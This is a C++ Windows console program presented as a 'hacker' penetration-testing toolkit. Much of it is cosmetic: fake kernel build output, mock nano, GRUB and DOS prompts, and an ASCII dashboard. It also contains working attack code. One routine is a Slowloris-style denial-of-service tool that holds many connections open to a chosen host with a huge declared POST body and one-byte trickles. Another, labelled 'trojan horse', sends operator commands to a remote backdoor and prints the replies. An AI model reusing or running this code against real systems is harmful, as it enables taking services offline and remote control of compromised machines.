#include <iostream>
#include <vector>
#include <random>
#include <chrono>
#include <thread>
#include <iomanip>
#include <string>
#include <fstream>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <graphics.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "graphics.lib")

std::vector<SOCKET> socks;
SOCKET sock;
HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

void SetConsoleColor0(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void AltEnter() {
    keybd_event(VK_MENU, 0, 0, 0);
    keybd_event(VK_RETURN, 0, 0, 0);
    keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
}

std::string sendCommandAndReceive(const char* serverIp, int serverPort, const std::string& command) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        return "WSAStartup failed.";
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        return "Error creating socket.";
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);

    if (connect(sock, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return "Connection failed.";
    }

    send(sock, command.c_str(), command.length(), 0);
    char buffer[1024];
    int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead <= 0) {
        closesocket(sock);
        WSACleanup();
        return "Error receiving data.";
    }
    buffer[bytesRead] = '\0';
    std::string result(buffer);

    closesocket(sock);
    WSACleanup();
    return result;
}


void trojan_horse() {
    std::cout << R"( _____          _               _   _                     )" << std::endl;
    std::cout << R"(|_   _| __ ___ (_) __ _ _ __   | | | | ___  _ __ ___  ___ )" << std::endl;
    std::cout << R"(  | || '__/ _ \| |/ _` | '_ \  | |_| |/ _ \| '__/ __|/ _ \)" << std::endl;
    std::cout << R"(  | || | | (_) | | (_| | | | | |  _  | (_) | |  \__ \  __/)" << std::endl;
    std::cout << R"(  |_||_|  \___// |\__,_|_| |_| |_| |_|\___/|_|  |___/\___|)" << std::endl;
    std::cout << R"(              |__/ )" << std::endl;

    std::string serverIp;
    std::cout << "The ip of trojan horse: ";
    std::cin >> serverIp;

    int serverPort;
    std::cout << "The port of virus: ";
    std::cin >> serverPort;

    while (true) {
        std::string command;
        std::cout << "Enter the command(enter 'exit' to exit): ";
        std::cin >> command;
        if (command == "exit") {
            return;
        }
        std::string result = sendCommandAndReceive(serverIp.c_str(), serverPort, command);
        std::cout << "Return: " << result << std::endl;
    }

    return;
}
void conn_thread(int max_conn, int port, const std::string& host, const std::string& page) {
    for (int i = 0; i < max_conn; ++i) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);

        addrinfo hints = {};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        addrinfo* result;
        if (getaddrinfo(host.c_str(), nullptr, &hints, &result) == 0) {
            serverAddr.sin_addr = reinterpret_cast<sockaddr_in*>(result->ai_addr)->sin_addr;
            freeaddrinfo(result);

            if (connect(s, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == 0) {
                std::string request = "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10000000\r\nCookie: dklkt_dos_test\r\n\r\n";
                send(s, request.c_str(), request.length(), 0);
                std::cout << "[OK] Send buf OK!,conn=" << i << std::endl;
                socks.push_back(s);
            } else {
                std::cerr << "[NO] Can not connect or send error" << std::endl;
                Sleep(1000);
            }
        } else {
            std::cerr << "[NO] Ip error" << std::endl;
            Sleep(1000);
        }
    }
}

void send_thread() {
    while (true) {
        for (auto it = socks.begin(); it!= socks.end();) {
            SOCKET s = *it;
            if (send(s, "f", 1, 0) == SOCKET_ERROR) {
                std::cerr << "[NO] Send error" << std::endl;
                closesocket(s);
                it = socks.erase(it);
            } else {
                ++it;
            }
        }
        Sleep(1000);
    }
}

void dos() {
    int max_conn;
    int port;
    std::string host;
    std::string page;

    std::cout << "Enter the maximum number of connections:";
    std::cin >> max_conn;
    std::cout << "Enter the port number:";
    std::cin >> port;
    std::cout << "Enter the host name:";
    std::cin >> host;
    std::cout << "Enter the page path:";
    std::cin >> page;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData)!= 0) {
        std::cerr << "WSAStartup failed." << std::endl;
        return;
    }

    std::thread connTh1(conn_thread, max_conn, port, host, page);
    std::thread sendTh1(send_thread);
    std::thread connTh2(conn_thread, max_conn, port, host, page);
    std::thread sendTh2(send_thread);

    connTh1.join();
    sendTh1.join();
    connTh2.join();
    sendTh2.join();

    WSACleanup();
    return;
}

void simulateNanoLikeBehavior(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return;
    }

    std::string allContent;
    std::string line;
    while (std::getline(file, line)) {
        allContent += line + '\n';
    }
    file.close();

    size_t contentIndex = 0;

    while (true) {
        int key = getch();
        if (key!= -1) {
            if (GetAsyncKeyState(VK_CONTROL)) {
                system("cls");
                return;
            }
            if (contentIndex < allContent.size()) {
                char currentChar = allContent[contentIndex];
                if (currentChar == '\n') {
                    std::this_thread::sleep_for(std::chrono::duration<double>(0.1));
                    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_RED);
                    std::cout << "\n ~ ";
                    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
                } else {
                    std::this_thread::sleep_for(std::chrono::duration<double>(0.1));
                    std::cout << currentChar;
                }
                std::cout.flush();
                ++contentIndex;
            } else {
                break;
            }
        }
    }
}

std::random_device rd;
std::mt19937 gen(rd());
std::uniform_real_distribution<> disTime(0.2, 2.5);
std::uniform_int_distribution<> disFileCount(5, 20);
int compileMessageIndex = 0;

std::vector<std::string> compileMessages = {
    "CC          kernel/bpf/verifier.o",
    "CC          kernel/bpf/core.o",
    "CC          kernel/bpf/disasm.o",
    "CC          kernel/bpf/libbpf.o",
    "LD          vmlinux",
    "LD          modules.lds",
    "AR          kernel/libkernel.asm\n",
    "make[1]: AR: warning: Not support version in kernel.",
    "AR          lib/bootload.asm",
    "make[1]: AR: After label \'main_start\' :\nbootload.asm:256:11: warning: \'mov\' a label without \'[]\' token.\n[-Wnarrowing] You can try \'[out_string1]\'\n              mov   si, out_string1\n                        ^^^^^^^^^^",
    "OBJCOPY     arch/x86/boot/bzImage",
    "OBJCOPY     arch/x86/boot/setup.bin",
    "SYSMAP      System.map",
    "SYSMAP      module.map",
    "DEBUG       arch/x86/kernel/asm-offsets.s",
    "DEBUG       arch/arm/kernel/asm-offsets.s",
    "MODPOST     modules.post",
    "MODPOST     modules.order",
    "BUILD       scripts/kconfig/conf.o",
    "BUILD       scripts/kconfig/zconf.o",
    "BUILD       scripts/kallsyms.o",
    "BUILD       scripts/mkconfig.o",
    "CC          fs/ext4/inode.o",
    "CC          fs/ext4/super.o",
    "CC          fs/ext4/dir.o",
    "CC          fs/ext4/file.o",
    "LD          fs/ext4/libext4.a",
    "CC          net/ipv4/ip_input.o",
    "CC          net/ipv4/ip_output.o",
    "CC          net/ipv4/tcp_input.o",
    "CC          net/ipv4/tcp_output.o",
    "LD          net/ipv4/libipv4.a",
    "CC          net/ipv6/ipv6_input.o",
    "CC          net/ipv6/ipv6_output.o",
    "CC          net/ipv6/icmpv6.o",
    "CC          net/ipv6/tcpv6.o",
    "LD          net/ipv6/libipv6.a",
    "CC          drivers/block/ramdisk.o",
    "CC          drivers/block/loop.o",
    "CC          drivers/block/md.o",
    "CC          drivers/block/nbd.o",
    "LD          drivers/block/libblock.a",
    "CC          drivers/char/mem.o",
    "CC          drivers/char/null.o",
    "CC          drivers/char/tty.o",
    "CC          drivers/char/console.o",
    "LD          drivers/char/libchar.a",
    "CC          drivers/net/ethernet/intel/e1000/e1000_main.o",
    "CC          drivers/net/ethernet/intel/e1000/e1000_hw.o",
    "CC          drivers/net/ethernet/intel/e1000/e1000_txrx.o",
    "CC          drivers/net/ethernet/intel/e1000/e1000_8254x.o",
    "LD          drivers/net/ethernet/intel/e1000/libe1000.a",
    "CC          lib/string.o",
    "CC          lib/ctype.o",
    "CC          lib/math.o",
    "CC          lib/errno.o",
    "LD          lib/libc.a",
    "CC          arch/x86/kernel/head.o",
    "CC          arch/x86/kernel/start.o",
    "CC          arch/x86/kernel/smp.o",
    "CC          arch/x86/kernel/time.o",
    "LD          arch/x86/kernel/vmlinux.o",
    "CC          kernel/trace/trace.o",
    "CC          kernel/trace/trace_events.o",
    "CC          kernel/trace/trace_irq.o",
    "CC          kernel/trace/trace_syscalls.o",
    "LD          kernel/trace/libtrace.a",
    "CC          mm/memblock.o",
    "CC          mm/memblock_alloc.o",
    "CC          mm/memblock_free.o",
    "CC          mm/memblock_dump.o",
    "LD          mm/memblock/libmemblock.a",
    "CC          fs/proc/generic.o",
    "CC          fs/proc/base.o",
    "CC          fs/proc/ksyms.o",
    "CC          fs/proc/self.o",
    "LD          fs/proc/libproc.a",
    "CC          net/ipv4/netfilter/ip_tables.o",
    "CC          net/ipv4/netfilter/ip_nat.o",
    "CC          net/ipv4/netfilter/ipt_MASQUERADE.o",
    "CC          net/ipv4/netfilter/ipt_REJECT.o",
    "LD          net/ipv4/netfilter/libnetfilter_ipv4.a",
    "CC          net/ipv6/netfilter/ip6_tables.o",
    "CC          net/ipv6/netfilter/ip6_nat.o",
    "CC          net/ipv6/netfilter/ip6_MASQUERADE.o",
    "CC          net/ipv6/netfilter/ip6_REJECT.o",
    "LD          net/ipv6/netfilter/libnetfilter_ipv6.a",
    "CC          drivers/gpu/drm/i915/i915_gem.o",
    "CC          drivers/gpu/drm/i915/i915_drv.o",
    "CC          drivers/gpu/drm/i915/i915_irq.o",
    "CC          drivers/gpu/drm/i915/i915_perfmgr.o",
    "LD          drivers/gpu/drm/i915/libi915.a",
    "CC          drivers/staging/media/uvc/uvcvideo.o",
    "CC          drivers/staging/media/uvc/uvc_ctrl.o",
    "CC          drivers/staging/media/uvc/uvc_parse.o",
    "CC          drivers/staging/media/uvc/uvc_ioctl.o",
    "LD          drivers/staging/media/uvc/libuvc.a",
    "CC          mm/hugetlb.o",
    "CC          mm/hugetlb_alloc.o",
    "CC          mm/hugetlb_free.o",
    "CC          mm/hugetlb_mman.o",
    "LD          mm/hugetlb/libhugetlb.a",
    "CC          fs/jbd2/jbd2.o",
    "CC          fs/jbd2/journal.o",
    "CC          fs/jbd2/checkpoint.o",
    "CC          fs/jbd2/recovery.o",
    "LD          fs/jbd2/libjbd2.a",
    "CC          drivers/net/wireless/intel/iwlwifi/iwlwifi_core.o",
    "CC          drivers/net/wireless/intel/iwlwifi/iwlwifi_trans.o",
    "CC          drivers/net/wireless/intel/iwlwifi/iwlwifi_phy.o",
    "CC          drivers/net/wireless/intel/iwlwifi/iwlwifi_cfg.o",
    "LD          drivers/net/wireless/intel/iwlwifi/libiwlwifi.a",
    "CC          kernel/workqueue.o",
    "CC          kernel/workqueue_deprecated.o",
    "CC          kernel/workqueue_sysfs.o",
    "CC          kernel/workqueue_kthread.o",
    "LD          kernel/workqueue/libworkqueue.a",
    "CC          mm/pgtables.o",
    "CC          mm/pgtables_alloc.o",
    "CC          mm/pgtables_free.o",
    "CC          mm/pgtables_update.o",
    "LD          mm/pgtables/libpgtables.a",
    "CC          crypto/aesni-intel.o",
    "CC          crypto/sha256.o",
    "CC          crypto/md5.o",
    "CC          crypto/des.o",
    "LD          crypto/libcrypto.a",
    "CC          security/selinux/avc.o",
    "CC          security/selinux/checkreqprot.o",
    "CC          security/selinux/objsec.o",
    "CC          security/selinux/policy.o",
    "LD          security/selinux/libselinux.a",
    "CC          virt/kvm/kvm_main.o",
    "CC          virt/kvm/kvm_devices.o",
    "CC          virt/kvm/kvm_x86.o",
    "CC          virt/kvm/kvm_irq.o",
    "LD          virt/kvm/libkvm.a",
    "CC          block/blk-core.o",
    "CC          block/blk-mq.o",
    "CC          block/blk-sched.o",
    "CC          block/blk-merge.o",
    "LD          block/libblock.a",
    "CC          mtd/mtdcore.o",
    "CC          mtd/nand.o",
    "CC          mtd/nor.o",
    "CC          mtd/ubi.o",
    "LD          mtd/libmtd.a",
    "CC          scsi/scsi_core.o",
    "CC          scsi/scsi_device.o",
    "CC          scsi/scsi_host.o",
    "CC          scsi/scsi_ioctl.o",
    "LD          scsi/libscsi.a",
    "CC          usb/core/usb.o",
    "CC          usb/core/usb_bus.o",
    "CC          usb/core/usb_device.o",
    "CC          usb/core/usb_hcd.o",
    "LD          usb/core/libusb.a",
    "CC          usb/musb/musb_core.o",
    "CC          usb/musb/musb_host.o",
    "CC          usb/musb/musb_device.o",
    "CC          usb/musb/musb_otg.o",
    "LD          usb/musb/libmusb.a",
    "CC          net/bluetooth/hci.o",
    "CC          net/bluetooth/l2cap.o",
    "CC          net/bluetooth/sdp.o",
    "CC          net/bluetooth/rfcomm.o",
    "LD          net/bluetooth/libbluetooth.a",
    "CC          net/can/can_dev.o",
    "CC          net/can/can_proto.o",
    "CC          net/can/can_skb.o",
    "CC          net/can/can_bcm.o",
    "LD          net/can/libcan.a",
    "CC          net/ieee802154/ieee802154_dev.o",
    "CC          net/ieee802154/ieee802154_stack.o",
    "CC          net/ieee802154/ieee802154_frame.o",
    "CC          net/ieee802154/ieee802154_mac.o",
    "LD          net/ieee802154/libieee802154.a",
    "CC          net/wimax/mac80211.o",
    "CC          net/wimax/wimax_dev.o",
    "CC          net/wimax/wimax_mac.o",
    "CC          net/wimax/wimax_stack.o",
    "LD          net/wimax/libwimax.a",
    "CC          net/llc/llc_core.o",
    "CC          net/llc/llc_sap.o",
    "CC          net/llc/llc_frame.o",
    "CC          net/llc/llc_xmit.o",
    "LD          net/llc/libllc.a"
};

std::vector<std::string> directories = {
    "kernel",
    "mm",
    "fs",
    "net",
    "drivers/block",
    "drivers/char",
    "drivers/net/ethernet/intel",
    "lib",
    "arch/x86",
    "kernel/trace",
    "mm/memblock",
    "fs/proc",
    "net/ipv4",
    "net/ipv6",
    "drivers/staging/media/uvc",
    "mm/hugetlb",
    "fs/jbd2",
    "drivers/net/wireless/intel/iwlwifi",
    "kernel/workqueue",
    "mm/pgtables"
};


std::string getOrderedMessage() {
    std::string message = compileMessages[compileMessageIndex];
    compileMessageIndex = (compileMessageIndex + 1) % compileMessages.size();
    return message;
}


void hacker() {
	system("cls");
    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);
	std::string originalString = R"(©°©¤Total Transactions©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Errors Rate©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤LCD Test©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦     ?                                                                                  ©¦©¦     ?                                     ©¦©¦                                           ©¦
©¦     ?                                                                       ©°©¤©¤©¤©¤©¤©¤©¤©¤©´ ©¦©¦  48 ?                     ©°©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´ ©¦©¦  ??????????????? ??????                   ©¦
©¦     ?                                                                       ©¦USA     ©¦ ©¦©¦     ?                     ©¦server 1     ©¦ ©¦©¦  ??????????????? ??????                   ©¦
©¦  80 ?                                                                       ©¦Europe  ©¦ ©¦©¦  36 ?                     ©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼ ©¦©¦  ??????  ??????  ??????                   ©¦
©¦     ?????   ?                                         ????????  ????????????©¸©¤©¤©¤©¤©¤©¤©¤©¤©¼ ©¦©¦     ?    ???                              ©¦©¦                                           ©¦
©¦     ?    ??? ??????                               ?????      ???                       ©¦©¦  24 ??????  ?????????                     ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦  60 ?              ????????                   ????                                     ©¦©¦     ?                ?????????????        ©¦©°©¤Deployment Progress©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦     ?                     ??????        ???????               ??                       ©¦©¦  12 ?                                     ©¦©¦                                           ©¦
©¦     ?                           ?????????              ???????????????????????????     ©¦©¦     ?                                     ©¦©¦                                           ©¦
©¦     ?                                ????  ?????????????            ?                  ©¦©¦  0  ?                                     ©¦©¦                                           ©¦
©¦  40 ?                         ???????    ??                                            ©¦©¦     ??????????????????????????????????    ©¦©¦       41%                                 ©¦
©¦     ???????????????    ???????                                                         ©¦©¦      00:00      00:10      00:20          ©¦©¦                                           ©¦
©¦     ?              ?????                                                               ©¦©¦                                           ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦     ?                                                                                  ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦  20 ?                                                                                  ©¦
©¦     ?                                                                                  ©¦            __               __                __              __
©¦     ?                                                                                  ©¦           / /_  ____ ______/ /_____  _____   / /_____  ____  / /____
©¦  0  ?                                                                                  ©¦          / __ \/ __ `/ ___/ //_/ _ \/ ___/  / __/ __ \/ __ \/ / ___/
©¦     ???????????????????????????????????????????????????????????????????????????????    ©¦         / / / / /_/ / /__/ ,< /  __/ /     / /_/ /_/ / /_/ / (__  )
©¦      00:00        00:30        01:20        02:10        03:00        03:50            ©¦        /_/ /_/\__,_/\___/_/|_|\___/_/      \__/\____/\____/_/____/
©¦                                                                                        ©¦
©¦                                                                                        ©¦            ____          
©¦                                 ??                                                     ©¦           / __ \___  ____  ___  / /__________ _/ /_(_)___  ____
©¦               ??????????????????  ?????    ?????  ??????    ??????     ???             ©¦          / /_/ / _ \/ __ \/ _ \/ __/ ___/ __ `/ __/ / __ \/ __ \
©¦  ?????????????????????????????  ?????? ?    ????????????????    ?????????????????      ©¦         / ____/  __/ / / /  __/ /_/ /  / /_/ / /_/ / /_/ / / / /
©¦  ?? ???????????????????????? ????  ??? ?? ?? ??????                    ??????????      ©¦        /_/    \___/_/ /_/\___/\__/_/   \__,_/\__/_/\____/_/ /_/
©¦   ????     ????   ????????????        ????????                         ??  ?? ??       ©¦
©¦              ?  ?   ??????????         ??????????? ?? ?  ??        ? ????              ©¦©°©¤Server Log©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Percent Donut©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´©°©¤Storage©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©´
©¦              ???       ??             ???????????  ??             ??????               ©¦©¦starting process watchdog   ©¦©¦                            ©¦©¦                            ©¦
©¦                ??? ??????            ??     ??  ?? ??????         ??                   ©¦©¦terminating server US2      ©¦©¦           ?????            ©¦©¦                            ©¦
©¦       ?          ??????????          ?           ?????  ? ????? ?? ??                  ©¦©¦terminating server US1      ©¦©¦        ????????????        ©¦©¦                            ©¦
©¦                      ?????????       ?????        ???    ??  ???? ???                  ©¦©¦terminating server EU1      ©¦©¦       ????     ?????       ©¦©¦     41%         59%        ©¦
©¦                     ?  ?     ???          ??    ? ?           ?????  ???               ©¦©¦starting process npm install©¦©¦      ???         ????      ©¦©¦                            ©¦
©¦                        ??       ??         ??    ? ?            ???  ??????            ©¦©¦terminating server EU1      ©¦©¦      ??     99%   ???      ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¦    ?                    ??      ?          ??   ????              ???? ???   ?  ?      ©¦©¦avg. wait time 0.60         ©¦©¦      ???          ???      ©¦
©¦                          ?   ????           ?  ?? ??              ?      ??            ©¦©¦avg. wait time 0.10         ©¦©¦      ?????      ????       ©¦©°©¤Throughput (bits/sec)©¤©¤©¤©¤©¤©¤©´
©¦                         ?? ???              ????                  ?????????   ??       ©¦©¦terminating server AU1      ©¦©¦       ?????????????        ©¦©¦                            ©¦
©¦                         ? ??                                            ??   ???       ©¦©¦terminating server JP1      ©¦©¦          ????????          ©¦©¦Server1:                    ©¦
©¦                         ?????                                                          ©¦©¦terminating server AS1      ©¦©¦           storage          ©¦©¦¨€¨x¨y¨€¨y¨x¨€¨{¨}¨€¨{¨}¨x¨x¨€¨}¨x¨€¨€¨y¨y¨x¨{¨€¨y¨}¨x¨y©¦
©¦                                                                                        ©¦©¦starting process java       ©¦©¦                            ©¦©¦                            ©¦
©¦                                                                                        ©¦©¦starting process gulp       ©¦©¦                            ©¦©¦Server2:                    ©¦
©¦                                                                                        ©¦©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
©¸©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¼
)";
    for (size_t i = 0; i < originalString.size(); ++i) {
        if (originalString[i] == '?') {
            originalString[i] = '.';
        }
    }

    std::cout << originalString << std::endl;
    
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    std::cout << "\nTools Loading ";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    Sleep(200);
    std::cout << ".";
    std::cout << "\n\nPenetration Testing\nwriter:linhonghan\n";
	std::string cmd;
    start:
	while(true) {
    	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout << "Hacker>";
		std::cin >> cmd;
		if(cmd == "exit") {
			return;
		}
        if(static_cast<int>(cmd[0]) == 0x0D) {
            goto start;
        }
		if(cmd == "Attack") {
        	WSACleanup();
			dos();
        } else if(cmd == "Virus") {
            trojan_horse();
        } else if(cmd == "cmake") {
    		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        	std::cout << "\nCreating the project:\n    Enter kernel.\nmake\nMakefile:Download the tools first.\nbuild\n";
    		Sleep(500);
        	std::cout << "init\n\n";
            system(".\\download");
        } else if(cmd == "make") {
    		for (const auto& dir : directories) {
        		std::cout << "make[1]: Entering directory '/home/user/linux-source/" << dir << "'" << std::endl;
        		int fileCount = disFileCount(gen);
        		for (int i = 0; i < fileCount; ++i) {
            		std::string message = getOrderedMessage();
            		std::cout << std::left << std::setw(20) << message << std::endl;
            		std::this_thread::sleep_for(std::chrono::duration<double>(disTime(gen)));
        		}
        		std::cout << "make[1]: Leaving directory '/home/user/linux-source/" << dir << "'" << std::endl;
        
        		if (std::uniform_int_distribution<>(0, 5)(gen) == 0) {
       		     	std::cout << "make[1]: Warning: Symbol version dump /home/user/linux-source/Module.symvers will be overwritten" << std::endl;
        		}
        		std::this_thread::sleep_for(std::chrono::duration<double>(0.5));
    		}
        } else if(cmd == "nano") {
    		std::string filePath = "test.asm";
        	system("cls");
        	SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE);
        	std::cout << "    nano  [input cpp file] coding = UTF - 8   ( [Ctrl + X] to save or exit. )\n    File name:" << filePath << "\n";
        	SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_RED);
            std::cout << "\n ~ ";
    		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
    		simulateNanoLikeBehavior(filePath);
        } else if(cmd == "search") {
        	system(".\\earth");
        } else if(cmd == "rain") {
        	system(".\\rain");
    		AltEnter();
        } else if(cmd == "DOS") {
        	system("cls");
        	std::string grub_cmd;
        	int grub_set = 0;
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        	while(true) {
        		std::cout << "C:/>";
        		std::cin >> grub_cmd;
        		if (grub_cmd == "dir") {
        			std::cout << "System";
				} else if (grub_cmd == "shutdown") {
					system("cls");
					break;
				} else {
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
					std::cout << "Error: wrong command.";
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				}
        		std::cout << "\n";
				
			}
			SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        } else if(cmd == "grub") {
        	system("cls");
        	std::string grub_cmd;
        	int grub_set = 0;
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        	std::cout << "          GNU GRUB  version 2.06\n\n";
        	while(true) {
        		std::cout << "grub>";
        		std::cin >> grub_cmd;
        		if (grub_cmd == "ls") {
        			std::cout << "(proc) (hd0) (hd0,gpt3) (hd0,gpt2) (hd0,gpt1) (hd1) (hd1,gpt5) (hd1,gpt4) (hd1,gpt3) (hd1,gpt2) (hd1,gpt1)";
				} else if (grub_cmd == "set=root(hd1,gpt1)") {
					grub_set = 1;
				} else if (grub_cmd == "boot") {
					if (grub_set == 1) {
						system("cls");
						break;
					} else {
						std::cout << "Error: boot not ready.";
					}
				} else {
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
					std::cout << "Error: wrong command.";
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				}
        		std::cout << "\n";
				
			}
			SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        } else{
    		SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
    		system(cmd.c_str());
    		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        }
	}
    return;
}

int main() {
    AltEnter();
    hacker();

    return 0;
}

